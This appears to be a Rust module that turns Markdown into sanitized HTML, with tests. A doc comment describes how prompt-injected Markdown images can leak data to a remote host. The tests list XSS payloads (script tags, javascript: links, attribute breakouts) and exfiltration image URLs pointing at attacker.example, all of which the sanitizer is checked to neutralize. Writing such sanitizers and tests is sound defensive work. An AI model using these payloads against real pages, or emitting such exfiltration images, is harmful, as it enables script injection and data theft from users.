//! CommonMark to sanitized HTML, for the web channel and the HTML part of email.

use pulldown_cmark::{CodeBlockKind, CowStr, Event, LinkType, Tag, TagEnd};
use pulldown_cmark_escape::{escape_href, escape_html};

use super::strip_controls;

/// The `rel` every rendered link carries.
const LINK_REL: &str = "noopener noreferrer nofollow";

/// Link targets that survive rendering, matched case-insensitively at the start of the URL.
const LINK_SCHEMES: [&str; 3] = ["http://", "https://", "mailto:"];

/// Media types of the `data:` images [`is_local_image`] accepts.
const DATA_IMAGE_TYPES: [&str; 5] = [
    "image/png",
    "image/jpeg",
    "image/gif",
    "image/webp",
    "image/avif",
];

/// Renders CommonMark as an HTML fragment that is safe to inline into a page or an email.
///
/// - Raw HTML in the input is escaped and shown as text.
/// - Links keep their target only for `http://`, `https://`, and `mailto:` URLs, and get
///   `rel="noopener noreferrer nofollow"`. Any other link (`javascript:`, `data:`, relative)
///   renders as its text alone.
/// - An image renders only if `allow_image` accepts its URL; otherwise its alt text is shown as
///   plain text. Pass [`is_local_image`] for the web channel. Never accept a remote URL: a
///   prompt-injected `![](https://attacker/?d=...)` would leak data as soon as the page loads.
/// - Control characters other than tab and newline are dropped.
pub fn html(markdown: &str, allow_image: impl Fn(&str) -> bool) -> String {
    let mut events = Vec::new();
    // For each open link, whether it was kept (and so needs a closing tag).
    let mut links = Vec::new();
    let mut parser = super::parser(markdown);
    while let Some(event) = parser.next() {
        let event = match event {
            Event::Text(text) => Event::Text(clean(text)),
            Event::Code(code) => Event::Code(clean(code)),
            Event::Html(html) | Event::InlineHtml(html) => Event::Text(clean(html)),
            Event::Start(Tag::HtmlBlock) => Event::Start(Tag::Paragraph),
            Event::End(TagEnd::HtmlBlock) => Event::End(TagEnd::Paragraph),
            Event::Start(Tag::Heading { level, .. }) => Event::Start(Tag::Heading {
                level,
                id: None,
                classes: Vec::new(),
                attrs: Vec::new(),
            }),
            Event::Start(Tag::BlockQuote(_)) => Event::Start(Tag::BlockQuote(None)),
            Event::Start(Tag::CodeBlock(CodeBlockKind::Fenced(info))) => Event::Start(
                Tag::CodeBlock(CodeBlockKind::Fenced(code_language(&info).into())),
            ),
            Event::Start(Tag::Link {
                link_type,
                dest_url,
                title,
                ..
            }) => {
                let href = link_href(link_type, &dest_url);
                links.push(href.is_some());
                match href {
                    Some(href) => Event::InlineHtml(anchor(&href, &title).into()),
                    None => continue,
                }
            }
            Event::End(TagEnd::Link) => match links.pop() {
                Some(true) => Event::InlineHtml("</a>".into()),
                _ => continue,
            },
            Event::Start(Tag::Image {
                dest_url, title, ..
            }) => {
                let alt = alt_text(&mut parser);
                if allow_image(&dest_url) {
                    Event::InlineHtml(image(&dest_url, &alt, &title).into())
                } else if alt.is_empty() {
                    continue;
                } else {
                    Event::Text(alt.into())
                }
            }
            event => event,
        };
        events.push(event);
    }
    let mut out = String::new();
    pulldown_cmark::html::push_html(&mut out, events.into_iter());
    out
}

/// Whether an image URL is local, so showing it loads nothing from a third party.
///
/// Accepts exactly two forms:
///
/// - a blob-store image served by the web channel: `/blobs/<id>`, where `<id>` is the blob's
///   SHA-256 as 64 lowercase hex digits;
/// - a `data:` URL whose media type is PNG, JPEG, GIF, WebP, or AVIF (SVG is refused).
pub fn is_local_image(url: &str) -> bool {
    if let Some(id) = url.strip_prefix("/blobs/") {
        return id.len() == 64 && id.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'));
    }
    if !starts_with_ignore_case(url, "data:") {
        return false;
    }
    let Some((header, _data)) = url["data:".len()..].split_once(',') else {
        return false;
    };
    let media_type = header.split(';').next().unwrap_or_default();
    DATA_IMAGE_TYPES
        .iter()
        .any(|allowed| media_type.eq_ignore_ascii_case(allowed))
}

/// Drops control characters from text the parser produced.
fn clean(text: CowStr<'_>) -> CowStr<'_> {
    match strip_controls(&text) {
        std::borrow::Cow::Borrowed(_) => text,
        std::borrow::Cow::Owned(cleaned) => cleaned.into(),
    }
}

/// Reduces a fenced code block's info string to a language name usable in a `class`.
pub(super) fn code_language(info: &str) -> String {
    info.split_ascii_whitespace()
        .next()
        .unwrap_or_default()
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || "+-_.#".contains(*c))
        .collect()
}

/// The `href` for a link, or `None` if its scheme isn't allowed.
fn link_href(link_type: LinkType, dest: &str) -> Option<String> {
    let href = match link_type {
        LinkType::Email => format!("mailto:{dest}"),
        _ => dest.to_owned(),
    };
    LINK_SCHEMES
        .iter()
        .any(|scheme| starts_with_ignore_case(&href, scheme))
        .then_some(href)
}

pub(super) fn starts_with_ignore_case(s: &str, prefix: &str) -> bool {
    s.as_bytes()
        .get(..prefix.len())
        .is_some_and(|start| start.eq_ignore_ascii_case(prefix.as_bytes()))
}

/// Consumes the events inside an image up to its end, returning their text for the alt text.
fn alt_text<'a>(events: &mut impl Iterator<Item = Event<'a>>) -> String {
    let mut alt = String::new();
    let mut depth = 1;
    for event in events {
        match event {
            Event::Start(Tag::Image { .. }) => depth += 1,
            Event::End(TagEnd::Image) => {
                depth -= 1;
                if depth == 0 {
                    break;
                }
            }
            Event::Text(text) | Event::Code(text) | Event::Html(text) | Event::InlineHtml(text) => {
                alt.push_str(&strip_controls(&text));
            }
            Event::SoftBreak | Event::HardBreak => alt.push(' '),
            _ => {}
        }
    }
    alt
}

fn anchor(href: &str, title: &str) -> String {
    let mut out = String::from("<a href=\"");
    push_escaped_href(&mut out, href);
    out.push_str("\" rel=\"");
    out.push_str(LINK_REL);
    push_title(&mut out, title);
    out.push_str("\">");
    out
}

fn image(src: &str, alt: &str, title: &str) -> String {
    let mut out = String::from("<img src=\"");
    push_escaped_href(&mut out, src);
    out.push_str("\" alt=\"");
    push_escaped_html(&mut out, alt);
    push_title(&mut out, title);
    out.push_str("\" />");
    out
}

/// Appends `" title="<title>` if the title isn't empty, leaving the attribute's quote open.
fn push_title(out: &mut String, title: &str) {
    if !title.is_empty() {
        out.push_str("\" title=\"");
        push_escaped_html(out, &strip_controls(title));
    }
}

fn push_escaped_href(out: &mut String, url: &str) {
    // Writing to a `String` can't fail.
    let _ = escape_href(out, url);
}

fn push_escaped_html(out: &mut String, text: &str) {
    // Writing to a `String` can't fail.
    let _ = escape_html(out, text);
}

#[cfg(test)]
mod tests {
    use super::*;

    const BLOB: &str = "/blobs/0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";

    fn render(markdown: &str) -> String {
        html(markdown, is_local_image)
    }

    #[test]
    fn renders_commonmark() {
        let cases: &[(&str, &str, &str)] = &[
            ("empty", "", ""),
            (
                "paragraph",
                "Hello, *world*!",
                "<p>Hello, <em>world</em>!</p>\n",
            ),
            (
                "headings",
                "# One\n\n## Two **bold**",
                "<h1>One</h1>\n<h2>Two <strong>bold</strong></h2>\n",
            ),
            (
                "nested emphasis",
                "***both*** and ~~gone~~",
                "<p><em><strong>both</strong></em> and <del>gone</del></p>\n",
            ),
            (
                "nested lists",
                "- a\n  1. b\n  2. c\n- [x] done",
                "<ul>\n<li>a\n<ol>\n<li>b</li>\n<li>c</li>\n</ol>\n</li>\n\
                 <li><input disabled=\"\" type=\"checkbox\" checked=\"\"/>\ndone</li>\n</ul>\n",
            ),
            (
                "blockquote",
                "> quoted\n> > deeper",
                "<blockquote>\n<p>quoted</p>\n<blockquote>\n<p>deeper</p>\n</blockquote>\n\
                 </blockquote>\n",
            ),
            (
                "code",
                "Use `a < b`.\n\n```rust\nfn main() {}\n```",
                "<p>Use <code>a &lt; b</code>.</p>\n\
                 <pre><code class=\"language-rust\">fn main() {}\n</code></pre>\n",
            ),
            (
                "table",
                "| a | b |\n|---|--:|\n| 1 | 2 |",
                "<table><thead><tr><th>a</th><th style=\"text-align: right\">b</th></tr>\
                 </thead><tbody>\n<tr><td>1</td><td style=\"text-align: right\">2</td></tr>\n\
                 </tbody></table>\n",
            ),
            (
                "link",
                "[docs](https://example.com/a?b=1&c=2 \"The docs\")",
                "<p><a href=\"https://example.com/a?b=1&amp;c=2\" \
                 rel=\"noopener noreferrer nofollow\" title=\"The docs\">docs</a></p>\n",
            ),
            (
                "autolinks",
                "<https://example.com> and <me@example.com>",
                "<p><a href=\"https://example.com\" rel=\"noopener noreferrer nofollow\">\
                 https://example.com</a> and <a href=\"mailto:me@example.com\" \
                 rel=\"noopener noreferrer nofollow\">me@example.com</a></p>\n",
            ),
            (
                "bare urls stay text",
                "see https://example.com",
                "<p>see https://example.com</p>\n",
            ),
            (
                "control characters",
                "a\u{1b}[31mb\u{7}c\u{85}d\te",
                "<p>a[31mbcd\te</p>\n",
            ),
        ];
        for (name, input, expected) in cases {
            assert_eq!(render(input), *expected, "case {name}");
        }
    }

    #[test]
    fn escapes_raw_html() {
        let cases: &[(&str, &str, &str)] = &[
            (
                "script block",
                "<script>alert(1)</script>",
                "<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>\n",
            ),
            (
                "inline image tag",
                "hi <img src=https://attacker/x onerror=alert(1)> there",
                "<p>hi &lt;img src=https://attacker/x onerror=alert(1)&gt; there</p>\n",
            ),
            (
                "html link",
                "<a href=\"javascript:alert(1)\">x</a>",
                "<p>&lt;a href=\"javascript:alert(1)\"&gt;x&lt;/a&gt;</p>\n",
            ),
            (
                "comment",
                "<!-- hidden -->",
                "<p>&lt;!-- hidden --&gt;</p>\n",
            ),
        ];
        for (name, input, expected) in cases {
            assert_eq!(render(input), *expected, "case {name}");
        }
    }

    #[test]
    fn drops_unsafe_links() {
        let cases = [
            "[x](javascript:alert(1))",
            "[x](JaVaScRiPt:alert(1))",
            "[x](java%0ascript:alert(1))",
            "<javascript:alert(1)>",
            "[x](vbscript:msgbox(1))",
            "[x](data:text/html,<script>alert(1)</script>)",
            "[x](/relative/path)",
            "[x](//attacker.example/)",
            "[x][r]\n\n[r]: javascript:alert(1)",
        ];
        for input in cases {
            let out = render(input);
            assert!(!out.contains("<a"), "{input:?} kept a link: {out}");
            assert!(!out.contains("href"), "{input:?} kept an href: {out}");
        }
        assert_eq!(render("[x](javascript:alert(1))"), "<p>x</p>\n");
    }

    #[test]
    fn link_attributes_cannot_break_out() {
        let out = render("[x](https://a.example/\"onmouseover=\"alert(1) \"t\\\" onclick=\\\"y\")");
        assert_eq!(
            out,
            "<p><a href=\"https://a.example/%22onmouseover=%22alert(1)\" \
             rel=\"noopener noreferrer nofollow\" title=\"t&quot; onclick=&quot;y\">x</a></p>\n"
        );
    }

    #[test]
    fn drops_remote_images() {
        let cases = [
            "![](https://attacker.example/?d=secret)",
            "![alt](HTTP://attacker.example/?d=secret)",
            "![](//attacker.example/?d=secret)",
            "![x][r]\n\n[r]: https://attacker.example/?d=secret",
            "[![](https://attacker.example/?d=secret)](https://example.com)",
            "![](/blobs/../../attacker.example/?d=secret)",
            "![](data:image/svg+xml,<svg/>?d=secret)",
            "![](data:text/html,secret)",
        ];
        for input in cases {
            let out = render(input);
            assert!(!out.contains("<img"), "{input:?} kept an image: {out}");
            assert!(!out.contains("secret"), "{input:?} kept the URL: {out}");
        }
        assert_eq!(
            render("![a *cat*](https://attacker.example/cat.png)"),
            "<p>a cat</p>\n"
        );
    }

    #[test]
    fn keeps_local_images() {
        assert_eq!(
            render(&format!("![a \"cat\"]({BLOB} \"Cat\")")),
            format!("<p><img src=\"{BLOB}\" alt=\"a &quot;cat&quot;\" title=\"Cat\" /></p>\n")
        );
        assert_eq!(
            render("![dot](data:image/png;base64,iVBORw0KGgo=)"),
            "<p><img src=\"data:image/png;base64,iVBORw0KGgo=\" alt=\"dot\" /></p>\n"
        );
        assert_eq!(
            html("![logo](cid:logo@example)", |url| url.starts_with("cid:")),
            "<p><img src=\"cid:logo@example\" alt=\"logo\" /></p>\n"
        );
    }

    #[test]
    fn recognizes_local_images() {
        let cases: &[(&str, bool)] = &[
            (BLOB, true),
            ("data:image/png;base64,AAAA", true),
            ("DATA:IMAGE/JPEG;base64,AAAA", true),
            ("data:image/webp,AAAA", true),
            ("data:image/svg+xml,<svg/>", false),
            ("data:text/html,x", false),
            ("data:image/png", false),
            ("/blobs/0123", false),
            (&BLOB.to_uppercase(), false),
            (
                "/blobs/../0123456789abcdef0123456789abcdef0123456789abcdef0123456789ab",
                false,
            ),
            ("https://example.com/a.png", false),
            ("//example.com/a.png", false),
            ("", false),
        ];
        for (url, expected) in cases {
            assert_eq!(is_local_image(url), *expected, "{url:?}");
        }
    }

    #[test]
    fn sanitizes_code_language_and_heading_attributes() {
        assert_eq!(
            render("```js\"onload=x more\ncode\n```"),
            "<pre><code class=\"language-jsonloadx\">code\n</code></pre>\n"
        );
        assert_eq!(
            render("# Title {#main .admin}"),
            "<h1>Title {#main .admin}</h1>\n"
        );
    }
}
